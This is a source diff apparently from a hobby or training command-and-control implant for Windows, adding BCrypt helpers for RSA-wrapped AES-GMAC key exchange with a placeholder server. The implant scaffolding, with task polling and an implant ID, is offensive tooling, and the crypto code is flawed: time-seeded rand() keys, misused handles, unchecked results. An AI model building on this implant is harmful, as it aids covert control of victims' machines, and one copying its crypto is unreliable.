@@ -8,6 +8,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <windows.h>
 #include <winhttp.h>
 #include <future> 
+#include <cmath>
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
 #define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"
@@ -26,6 +27,78 @@ void tasks()
         Sleep(SLEEP);
     }
 }
+
+
+
+BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
+    BCRYPT_ALG_HANDLE rsahandle;
+    BCryptOpenAlgorithmProvider(&rsahandle,BCRYPT_RSA_ALGORITHM,NULL,0);
+    BCRYPT_KEY_HANDLE outro=new BCRYPT_KEY_HANDLE;
+    BCryptImportKeyPair(rsahandle,NULL,BCRYPT_RSAPUBLIC_BLOB,&outro,pbinnput,pbinputsize,BCRYPT_NO_KEY_VALIDATION);
+    return outro;
+}
+PUCHAR rsaEncrypt(BCRYPT_KEY_HANDLE rsakeyhandle,PUCHAR symkey, ULONG symkeysize){ 
+    //Function adapted from https://stackoverflow.com/questions/58419870/how-to-use-bcrypt-for-rsa-asymmetric-encryption
+    ULONG encbuffersize;
+    NTSTATUS status = BCryptEncrypt(rsakeyhandle,
+    symkey,
+    symkeysize,
+    NULL,
+    NULL,
+    0,
+    NULL,
+    0,
+    &encbuffersize,
+    0);
+    PUCHAR encbuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encbuffersize);
+    if (encbuffer == NULL) {
+        printf("failed to allocate memory for blindedFEKBuffer\n");
+    }
+    BCryptEncrypt(rsakeyhandle,symkey,symkeysize,NULL,NULL,0,encbuffer,encbuffersize,&encbuffersize,0);
+    return encbuffer;
+}
+char* getsecret(){
+    char* secret=(char*)malloc(8);
+    std::string alphabet="abcdefghijklmonpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    unsigned int ms =std::time(nullptr);
+    double mod=61;
+    srand(ms);
+    for(int i=0;i<8;i++){
+        if(i==4){
+            srand(ms+1);
+        }
+        int randomvalue=std::fmod(rand(),mod);
+        secret[i]=alphabet[randomvalue];
+    }
+    return secret;
+}
+
+ BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey){
+    BCRYPT_ALG_HANDLE ahandle;
+    BCRYPT_KEY_HANDLE symkeyhandle = new BCRYPT_KEY_HANDLE;
+    ULONG symkeypropertylen;
+    ULONG bytescopied;
+    BCryptOpenAlgorithmProvider(&ahandle,BCRYPT_AES_GMAC_ALGORITHM,NULL,0);
+    
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
+    PUCHAR symkeylen=(PUCHAR)malloc(symkeypropertylen);
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,symkeylen,symkeypropertylen,&bytescopied,0);
+    //PUCHAR symkey=(PUCHAR)malloc(symkeylen);  
+    
+    /*
+    BCryptGetProperty(ahandle,BCRYPT_KEY_LENGTH,NULL,0,&symkeypropertylen,0);
+    PUCHAR symkeyobjlen=(PUCHAR)malloc(symkeypropertylen);
+    BCryptGetProperty(ahandle,BCRYPT_OBJECT_LENGTH,symkeyobjlen,symkeypropertylen,&bytescopied,0);
+    PUCHAR symkeyobj=(PUCHAR)malloc((int)symkeyobjlen);
+    */
+    char* secret=getsecret();
+    BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,NULL,0,(PUCHAR)secret,8,0);
+    //BCryptGenerateSymmetricKey(ahandle,&symkeyhandle,symkeyobj,(ULONG)symkeyobjlen,(PUCHAR)secret,8,0);
+    free(symkeylen);
+    return symkeyhandle;
+    }
+
+
 
 std::string makeHttpRequest(std::string fqdn, int port, std::string uri, int implant_id) {
     // Used Windows documentation for every function
